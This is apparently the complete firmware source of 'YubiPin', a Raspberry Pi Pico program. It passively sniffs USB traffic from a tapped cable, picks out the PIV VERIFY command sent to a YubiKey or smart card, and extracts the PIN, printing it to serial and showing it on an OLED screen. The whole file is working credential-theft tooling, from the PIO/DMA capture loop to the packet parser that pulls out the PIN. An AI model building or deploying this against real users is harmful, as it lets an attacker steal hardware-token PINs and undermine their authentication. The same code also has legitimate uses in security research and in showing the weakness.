#include <stdio.h>
#include <string.h>

#include "pico/stdlib.h"
#include "pico/multicore.h"
#include "pico/util/queue.h"
#include "pico/time.h"
#include "hardware/pio.h"
#include "hardware/clocks.h"
#include "hardware/dma.h"
#include "hardware/irq.h"
#include "hardware/i2c.h"

#include "pico-ssd1306/ssd1306.h"
#include "pico-ssd1306/textRenderer/TextRenderer.h"
#include "pico-ssd1306/textRenderer/12x16_font.h"

#include "usb_sniff.pio.h"


#define DP_PIN 14          // USB D+ pin
#define DM_PIN (DP_PIN + 1) // Next to the D+ pin (because of the restriction of PIO)

#define SCL_PIN 27
#define SDA_PIN 26

#define PIO_IRQ_EOP 0

#define PIN_SIZE 8

#define CAPTURE_BUF_LEN 8192
#define PACKET_QUEUE_LEN 8192

#define USB_MAX_PACKET_LEN 1028 // Max length of a packet including sync pattern, PID, and CRC

// Maximum length of packet (header + USB packet) sent to PC (before SLIP encoding)
// 1 is subtracted from USB_MAX_PACKET_LEN beceuse SYNC is not sent to the PC
#define SERIAL_MAX_PACKET_LEN (sizeof(serial_packet_header_t) + USB_MAX_PACKET_LEN - 1)

#define USB_SYNC 0x80   // USB sync pattern before NRZI encoding (because USB is LSB-first, actual bit sequence is reversed)

// This structure represents position of a packet in capture_buf
typedef struct {
  uint start_pos;
  uint len;
  absolute_time_t timestamp;
} packet_pos_t;

// Ring buffer which stores data of received packets
// We use 32 bits to store one byte of received data, because 0xFFFFFFFF is used to represent an End of Packet (EOP).
uint32_t capture_buf[CAPTURE_BUF_LEN];
// For transmission of packet_pos_t from Core 1 to Core 0
queue_t packet_queue;

// Number of DMA channel used for capturing
uint capture_dma_chan;

pico_ssd1306::SSD1306 *display;

// Called when DMA completes transfer of data whose amount is specified in its setting
void handle_dma_complete_interrupt()
{
  dma_channel_acknowledge_irq0(capture_dma_chan);
  dma_channel_set_write_addr(capture_dma_chan, capture_buf, true);  // Restart DMA
}

void usb_sniff_program_init(PIO pio, uint sm, uint offset, uint dp_pin, uint dma_chan)
{
  // Get default configuration for a PIO state machine
  pio_sm_config conf = usb_sniff_program_get_default_config(offset);
  // Input number 0 is assigned to USB D+ pin (GPIO number is dp_pin).
  // Input number 1 is USB D- pin (GPIO number is dp_pin+1).
  sm_config_set_in_pins(&conf, dp_pin);
  // Right shift (LSB first), autopush when 8 bits are read
  sm_config_set_in_shift(&conf, true, true, 8);
  // Right shift (LSB first), no autopull
  sm_config_set_out_shift(&conf, true, false, 32);
  // 120 MHz clock (10 x 12 Mbps)
  sm_config_set_clkdiv(&conf, (float)clock_get_hz(clk_sys) / 120000000);
  // Because only RX FIFO is needed, two FIFOs are combined into single RX FIFO.
  sm_config_set_fifo_join(&conf, PIO_FIFO_JOIN_RX);

  pio_gpio_init(pio, dp_pin);  // Allow PIO to use the specified pin
  pio_gpio_init(pio, dp_pin + 1);
  pio_sm_set_consecutive_pindirs(pio, sm, dp_pin, 2, false);  // Speicify D+ and D- pins as input

  pio_sm_init(pio, sm, offset, &conf);  // Initialize the state machine with the config created above

  // Store DMA channel number for use in Core 1
  capture_dma_chan = dma_chan;

  // DMA configuration
  dma_channel_config chan_conf = dma_channel_get_default_config(dma_chan);
  channel_config_set_read_increment(&chan_conf, false); // Always read from same address (RX FIFO)
  channel_config_set_write_increment(&chan_conf, true); // Write address increases after writing each byte
  channel_config_set_transfer_data_size(&chan_conf, DMA_SIZE_32);  // Transfer 4 bytes at once
  channel_config_set_dreq(&chan_conf, pio_get_dreq(pio, sm, false));  // PIO SM requests DMA to transfer
  // Apply configuration to a DMA channel
  dma_channel_configure(
    dma_chan, &chan_conf,
    capture_buf,
    &pio->rxf[sm],
    CAPTURE_BUF_LEN,
    false  // Don't start now
  );

  // Interrupt when DMA transfer is finished
  // It is used to make DMA run forever and implement a ring buffer
  dma_channel_set_irq0_enabled(dma_chan, true); // DMA_IRQ_0 is fired when DMA completes
  irq_set_exclusive_handler(DMA_IRQ_0, handle_dma_complete_interrupt);  // Handler runs on current core
  irq_set_priority(DMA_IRQ_0, 0); // DMA interrupt has the highest priority
  irq_set_enabled(DMA_IRQ_0, true);

  dma_channel_start(dma_chan);  // Start DMA

  pio_sm_set_enabled(pio, sm, true);  // Start the state machine
}

// Capture USB traffic on Core 1
void usb_read_loop()
{
  PIO pio = pio0;

  // Load program into a PIO module and store the offset address where it is loaded
  uint offset = pio_add_program(pio, &usb_sniff_program);

  uint sm = pio_claim_unused_sm(pio, true);
  uint dma_chan = dma_claim_unused_channel(true);
  usb_sniff_program_init(pio, sm, offset, DP_PIN, dma_chan);

  uint pos = 0;
  uint packet_start_pos = 0;

  while (true) {
    while (pos != (((uint32_t*)(dma_hw->ch[capture_dma_chan].write_addr) - capture_buf) % CAPTURE_BUF_LEN)) {
      if (capture_buf[pos] == 0xFFFFFFFF) { // When an EOP is detected
        packet_pos_t packet_pos = {
          .start_pos = packet_start_pos,
          .len = (pos > packet_start_pos)
                  ? (pos - packet_start_pos)
                  : ((CAPTURE_BUF_LEN - packet_start_pos) + pos),
          .timestamp = get_absolute_time()
        };
        queue_add_blocking(&packet_queue, &packet_pos); // Copy packet_pos and send to Core 0

        packet_start_pos = (pos + 1) % CAPTURE_BUF_LEN;
      }

      pos = (pos + 1) % CAPTURE_BUF_LEN;
    }
  }
}

uint8_t capture_byte(uint pos)
{
  return capture_buf[pos % CAPTURE_BUF_LEN] >> 24;
}

void show_pin(const char* pin)
{
  display->clear();
  pico_ssd1306::drawText(display, font_12x16, "~YubiPin~", 10, 0);
  pico_ssd1306::drawText(display, font_12x16, pin, 16, 28);
  display->sendBuffer();
}

void process_usb_packet(packet_pos_t packet)
{
  if (packet.len <= 1) {
    // Skip invalid packet which has no content
    return;
  }

  uint cur_pos = packet.start_pos;
  uint8_t first_byte = capture_byte(cur_pos++);
  uint8_t second_byte = capture_byte(cur_pos++);

  if (first_byte != USB_SYNC) {
    // Skip invalid packet which does not start with sync pattern
    return;
  }

  // First 4 bits of the second byte are bit-inversion of PID, and the rest are PID itself.
  if (((~(second_byte >> 4)) & 0xF) != (second_byte & 0xF)) {
    // Skip invalid packet which has a broken PID byte (First 4 bits are not bit-inversion of the rest)
    return;
  }

  uint pid = second_byte & 0xF;
  if (pid != 0b0011 && pid != 0b1011) {
    // not DATA0 or DATA1 PID
    return;
  }

  if (packet.len < 2 + 10 + 5 + PIN_SIZE + 2) {
    // too small
    return;
  }

  if (capture_byte(cur_pos++) != 0x6f) {
    // not XfrBlock
    return;
  }

  /*
    All bulk messages begin with a 10-bytes header, followed by message-specific data. The
    header consists of a message type (1 byte), a length field (four bytes), the slot number
    (1 byte), a sequence number field (1 byte), and either three message specific bytes, or a
    status field (1 byte), an error field and one message specific byte. The purpose of the
    10-byte header is to provide a constant offset at which message data begins across all
    messages.
  */
  cur_pos += 9;
  // uint msg_len =
  //   (capture_byte(cur_pos++)) +
  //   (capture_byte(cur_pos++) << 8) +
  //   (capture_byte(cur_pos++) << 16) +
  //   (capture_byte(cur_pos++) << 24);
  // cur_pos += 5;

  if (capture_byte(cur_pos++) != 0x00 || capture_byte(cur_pos++) != 0x20) {
    // https://docs.yubico.com/yesdk/users-manual/application-piv/apdu/verify.html
    return;
  }

  if (capture_byte(cur_pos++) != 0x00 || capture_byte(cur_pos++) != 0x80) {
    // https://docs.yubico.com/yesdk/users-manual/application-piv/apdu/verify.html
    return;
  }

  // 00 20 00 80 08 PIN (absent)
  cur_pos++;

  char pin[PIN_SIZE + 1] = {0};
  for (int i = 0; i < PIN_SIZE; ++i) {
    uint8_t sym = capture_byte(cur_pos + i);
    if (sym == 0xff) {
      pin[i] = 0x00;
    } else {
      pin[i] = sym;
    }
  }
  cur_pos += PIN_SIZE;

  fprintf(stdout,  "Oh yeah, here is the PIN: %s\n", pin);
  fflush(stdout);
  show_pin(pin);
}

int main()
{
  // Change system clock to 120 MHz (10 times the frequency of USB Full Speed)
  set_sys_clock_khz(120000, true);

  stdio_usb_init();

  // Initialize display
  i2c_init(i2c1, 50000);
  gpio_set_function(SDA_PIN, GPIO_FUNC_I2C);
  gpio_set_function(SCL_PIN, GPIO_FUNC_I2C);
  gpio_pull_up(SDA_PIN);
  gpio_pull_up(SCL_PIN);

  queue_init(&packet_queue, sizeof(packet_pos_t), PACKET_QUEUE_LEN);

  // Wait some time while display chip bootup
  sleep_ms(500);

  // Start core1_main on another core
  multicore_launch_core1(usb_read_loop);

  // Initialize display
  display = new pico_ssd1306::SSD1306(i2c1, 0x3C, pico_ssd1306::Size::W128xH64);
  display->setOrientation(0);
  show_pin("********");

  // And parse USB packets, yay
  packet_pos_t packet;
  while (true) {
    if (queue_try_remove(&packet_queue, &packet)) {
      process_usb_packet(packet);
    }
  }
}
